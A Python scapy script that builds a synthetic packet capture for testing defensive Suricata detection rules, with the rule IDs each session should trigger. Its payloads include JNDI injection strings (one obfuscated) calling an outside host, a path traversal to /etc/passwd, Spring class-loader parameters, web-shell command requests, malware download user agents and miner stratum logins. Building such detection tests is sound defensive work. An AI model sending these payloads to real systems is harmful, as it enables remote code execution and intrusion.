#!/usr/bin/env python3
"""Build a synthetic pcap that should trigger specific blue-team Suricata rules.

Every session uses documentation / private address space and fake payloads.
No real malware or exploit code is involved: the payloads are just the
strings the rules look for.

Usage: make_pcap.py out.pcap
Prints the SIDs each session is expected to trigger as JSON on stdout.
"""

import json
import sys

from scapy.all import DNS, DNSQR, IP, TCP, UDP, Raw, wrpcap

CLIENT_EXT = "198.51.100.10"   # TEST-NET-2, "internet"
SERVER_INT = "10.10.10.20"     # HOME_NET web server
HOST_INT = "10.10.20.30"       # HOME_NET workstation / server
SERVER_EXT = "203.0.113.50"    # TEST-NET-3, "internet"
DNS_SRV = "10.10.0.53"

packets = []
expected = {}
_sport = [40000]


def tcp_session(src, dst, dport, request: bytes, response: bytes = b""):
    """Three-way handshake, one request, optional response, FIN."""
    _sport[0] += 1
    sport = _sport[0]
    c_seq, s_seq = 1000, 5000
    pk = [
        IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="S", seq=c_seq),
        IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="SA", seq=s_seq, ack=c_seq + 1),
        IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="A", seq=c_seq + 1, ack=s_seq + 1),
        IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="PA", seq=c_seq + 1, ack=s_seq + 1) / Raw(request),
    ]
    c_next = c_seq + 1 + len(request)
    pk.append(IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="A", seq=s_seq + 1, ack=c_next))
    s_next = s_seq + 1
    if response:
        pk.append(IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="PA", seq=s_next, ack=c_next) / Raw(response))
        s_next += len(response)
        pk.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="A", seq=c_next, ack=s_next))
    pk += [
        IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="FA", seq=c_next, ack=s_next),
        IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="FA", seq=s_next, ack=c_next + 1),
        IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="A", seq=c_next + 1, ack=s_next + 1),
    ]
    packets.extend(pk)


def http_req(method, path, host, headers=None, body=b""):
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
    for k, v in (headers or {}).items():
        lines.append(f"{k}: {v}")
    if body:
        lines.append(f"Content-Length: {len(body)}")
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


def http_resp(body: bytes, ctype="text/html"):
    head = f"HTTP/1.1 200 OK\r\nContent-Type: {ctype}\r\nContent-Length: {len(body)}\r\n\r\n"
    return head.encode() + body


OK = http_resp(b"ok")

# 9100001: JNDI in the request line
tcp_session(CLIENT_EXT, SERVER_INT, 80, http_req("GET", "/search?q=${jndi:ldap://203.0.113.9/a}", "app.example"), OK)
expected["jndi_request_line"] = [9100001]

# 9100002: JNDI in a header
tcp_session(CLIENT_EXT, SERVER_INT, 80, http_req("GET", "/", "app.example", {"User-Agent": "${jndi:dns://203.0.113.9/x}"}), OK)
expected["jndi_header"] = [9100002]

# 9100003: obfuscated JNDI
tcp_session(CLIENT_EXT, SERVER_INT, 80, http_req("GET", "/?x=${${lower:j}${lower:n}di:ldap://203.0.113.9/a}", "app.example"), OK)
expected["jndi_obfuscated"] = [9100003]

# 9100004: path traversal
tcp_session(CLIENT_EXT, SERVER_INT, 80, http_req("GET", "/download?file=../../../../etc/passwd", "app.example"), OK)
expected["path_traversal"] = [9100004]

# 9100005: class loader manipulation
body = b"class.module.classLoader.resources.context.parent.pipeline.first.pattern=test"
tcp_session(CLIENT_EXT, SERVER_INT, 80, http_req("POST", "/app/form", "app.example",
            {"Content-Type": "application/x-www-form-urlencoded"}, body), OK)
expected["classloader"] = [9100005]

# 9100010 + 9100011: command in parameter, Windows output in response
tcp_session(CLIENT_EXT, SERVER_INT, 80, http_req("GET", "/upload/img.aspx?c=ipconfig", "app.example"),
            http_resp(b"\r\nWindows IP Configuration\r\n\r\nEthernet adapter Ethernet0:\r\n"))
expected["webshell_windows"] = [9100010, 9100011]

# 9100012: id output in response
tcp_session(CLIENT_EXT, SERVER_INT, 80, http_req("GET", "/files/x.php?cmd=id", "app.example"),
            http_resp(b"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"))
expected["webshell_unix_id"] = [9100012]

# 9100020: PowerShell user agent outbound
tcp_session(HOST_INT, SERVER_EXT, 80, http_req("GET", "/a.ps1", "dl.example",
            {"User-Agent": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1"}), OK)
expected["powershell_ua"] = [9100020]

# 9100021: certutil user agent
tcp_session(HOST_INT, SERVER_EXT, 80, http_req("GET", "/p.txt", "dl.example", {"User-Agent": "CertUtil URL Agent"}), OK)
expected["certutil_ua"] = [9100021]

# 9100022 (+9100023 setter, noalert): MZ from raw-IP host
tcp_session(HOST_INT, SERVER_EXT, 80, http_req("GET", "/update.bin", "203.0.113.50"),
            http_resp(b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 64, "application/octet-stream"))
expected["mz_from_raw_ip"] = [9100022]

# 9100030: stratum login
tcp_session(HOST_INT, SERVER_EXT, 3333,
            b'{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"x","pass":"x","agent":"XMRig/6.21.0"}}\n')
expected["stratum_login"] = [9100030]

# 9100031: mining.subscribe
tcp_session(HOST_INT, SERVER_EXT, 4444, b'{"id":1,"method":"mining.subscribe","params":["miner/1.0"]}\n')
expected["stratum_subscribe"] = [9100031]

# 9100032: mining pool DNS
packets.append(IP(src=HOST_INT, dst=DNS_SRV) / UDP(sport=53001, dport=53) / DNS(id=1, rd=1, qd=DNSQR(qname="pool.supportxmr.com")))
expected["mining_dns"] = [9100032]

# 9100041: TLS to dynamic DNS (minimal ClientHello with SNI)
def client_hello(sni: str) -> bytes:
    name = sni.encode()
    sni_ext = b"\x00\x00" + (len(name) + 5).to_bytes(2, "big") + (len(name) + 3).to_bytes(2, "big") + b"\x00" + len(name).to_bytes(2, "big") + name
    exts = sni_ext
    body = (b"\x03\x03" + b"\x11" * 32 + b"\x00" + b"\x00\x02\x13\x01" + b"\x01\x00"
            + len(exts).to_bytes(2, "big") + exts)
    hs = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x01" + len(hs).to_bytes(2, "big") + hs


tcp_session(HOST_INT, SERVER_EXT, 443, client_hello("c2-relay.duckdns.org"))
expected["tls_dyndns"] = [9100041]

# Benign controls: must trigger nothing from this rule set
tcp_session(CLIENT_EXT, SERVER_INT, 80, http_req("GET", "/index.html?page=2", "app.example",
            {"User-Agent": "Mozilla/5.0"}), http_resp(b"<html>hello</html>"))
tcp_session(HOST_INT, SERVER_EXT, 443, client_hello("www.example.com"))
expected["benign_controls"] = []

if __name__ == "__main__":
    wrpcap(sys.argv[1], packets)
    print(json.dumps(expected))
